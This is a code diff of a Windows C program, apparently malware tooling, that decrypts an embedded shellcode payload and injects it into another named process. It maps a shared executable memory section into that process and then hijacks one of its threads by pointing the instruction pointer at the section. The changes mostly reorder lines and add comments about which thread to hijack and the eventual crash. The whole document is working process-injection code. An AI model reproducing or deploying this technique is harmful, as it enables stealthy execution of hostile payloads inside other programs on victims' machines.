@@ -122,6 +122,9 @@ int main()
     {
         return 1;
     }
+
+
+    //Some boring struct definitions...
     HANDLE sectionHandle = NULL;
     SIZE_T shellcodesize = sizeof(rawData);
     LARGE_INTEGER sectionSize = { shellcodesize };
@@ -137,23 +140,27 @@ int main()
     InitializeObjectAttributes(&SectionObjectAttributes, NULL, 0, NULL, NULL);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
     CLIENT_ID uPid = { 0 };
+    DWORD LaPID = GetProcessIDFromName(WHERETOMIGRATE);
+    HANDLE notreallyhandle = (void*)LaPID;
     uPid.UniqueThread = (HANDLE)0;
+    uPid.UniqueProcess = notreallyhandle;
     HANDLE targetHandle = NULL;
     OBJECT_ATTRIBUTES ObjectAttributes;
     PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
     InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
     Threadsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    DWORD LaPID = GetProcessIDFromName(WHERETOMIGRATE);
-    HANDLE notreallyhandle = (void*)LaPID;
-    uPid.UniqueProcess = notreallyhandle;
+    
+    
 
     NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, &SectionObjectAttributes, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &shellcodesize, 2, NULL, PAGE_READWRITE);
     NtOpenProcess(&targetHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
     Thread32First(snapshot, &threadEntry);
+
+    //Thread walking
     OBJECT_ATTRIBUTES ThreadObjectAttributes;
     InitializeObjectAttributes(&ThreadObjectAttributes, NULL, 0, NULL, NULL);
-    int counter = 0;
+    int counter = 0;//To avoid hijacking the first thread
     while (Thread32Next(snapshot, &threadEntry))
     {
         if (threadEntry.th32OwnerProcessID == LaPID && counter > 1)
@@ -169,7 +176,7 @@ int main()
     NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &shellcodesize, 2, NULL, PAGE_EXECUTE_READ);
     decrypt();
     memcpy(localSectionAddress, &rawData, shellcodesize);
-    context.Rip = (DWORD_PTR)remoteSectionAddress;
+    context.Rip = (DWORD_PTR)remoteSectionAddress; //Yes, very aggresive and will eventually cause the program to crash once the shellcode finishes its execution
     NtSetContextThread(threadHijacked, &context);
     NtResumeThread(threadHijacked, &suspendcount);
     return 0;
